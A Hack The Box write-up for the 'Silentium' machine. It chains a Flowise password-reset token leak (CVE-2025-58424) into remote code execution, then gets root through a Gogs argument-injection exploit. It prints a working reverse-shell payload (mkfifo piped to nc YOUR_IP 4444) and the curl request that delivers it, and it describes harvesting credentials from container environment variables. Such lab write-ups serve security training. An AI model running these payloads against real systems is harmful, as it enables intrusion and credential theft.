# Machine: Silentium (Hack The Box)

## Enumeration

I started by running a port scan with Nmap to identify running services on the target.

<img width="675" height="80" alt="nmap" src="https://github.com/user-attachments/assets/550bbcf0-7077-48b1-96e9-bb7144b851a0" />

A web application was found running. I began enumerating the service and found a potential username — **Ben** — listed in the contributors section of the main page.

I attempted to discover hidden directories with Gobuster but found nothing relevant, so I moved on to subdomain enumeration.

<img width="1124" height="276" alt="gobuster" src="https://github.com/user-attachments/assets/3e581dad-57ad-4bc7-90b3-d53ea4d7b66d" />

Accessing the discovered subdomain (`staging.silentium.htb`), I found a login page for **Flowise** — an AI automation platform.

<img width="1776" height="792" alt="flowise" src="https://github.com/user-attachments/assets/3b4b1e0d-baf7-48b8-a5d0-e21d4ba2693c" />

I accessed `/api/v1/version` to check if the version was exposed and confirmed the Flowise version was **3.0.5**.

This version is vulnerable to **CVE-2025-58424**, which exposes sensitive data via the `/api/v1/forgot-password` endpoint. When a user requests a password reset, the server responds with a JSON body containing a `tempToken` — which should only be sent to the user's email.

## Exploitation

Using Burp Suite to intercept the forgot-password request, I captured the temporary token directly from the server response and used it to reset the admin password.

<img width="1108" height="505" alt="token" src="https://github.com/user-attachments/assets/91e4ebcc-c551-4df0-9a62-3a552b32b79b" />

Inside the admin dashboard, I found an **API key** that granted permission to interact with the `api/v1/node-load-method/customMCP` endpoint and access the `child_process` module — allowing me to upload a reverse shell payload as a `.json` file with JavaScript and execute it without validation (RCE).

I set up a Netcat listener on port 4444.

**Payload preparation (`payload.json`):**
```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f');return 1;})()} )"
  }
}
```

**Uploading and executing the payload:**
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <ApiKey>" \
  -d @payload.json
```

I gained root access inside a Docker container and searched for credentials. Running `env` revealed environment variables containing **SMTP service credentials**.

<img width="612" height="511" alt="docker" src="https://github.com/user-attachments/assets/442f3c12-cc6f-4e6f-b8b1-afcf7a792a7e" />

Testing the discovered password via SSH with user **Ben** granted access to the target machine. I retrieved the user flag.

<img width="565" height="104" alt="userflag" src="https://github.com/user-attachments/assets/e641300d-6c05-408a-9791-813e5e72e3bd" />

## Privilege Escalation

During enumeration, I noticed the **Gogs** service running on localhost.

Outdated versions of Gogs may be vulnerable to **CVE-2025-8110** — an argument injection flaw that can be used for privilege escalation if Gogs is running as root. This CVE allows Git configurations to be manipulated through malicious repositories.

To access the locally running Gogs service, I set up port forwarding.

```bash
ssh -L 3001:127.0.0.1:3001 ben@<targetIp>
```

I created a Gogs account, extracted the API key, and set up a Netcat listener on port 5555.

I then used a Python script that automates the argument injection exploit.

```bash
python3 exploit.py -u http://localhost:3001 -un [YOUR_USERNAME] -pw [YOUR_PASSWORD] -t YOUR_TOKEN -lh [IP] -lp 5555
```

I received a root shell and extracted the root flag, successfully completing the machine.

<img width="267" height="109" alt="rootflag" src="https://github.com/user-attachments/assets/bfe27004-d52d-4f8d-b195-205f210e3641" />
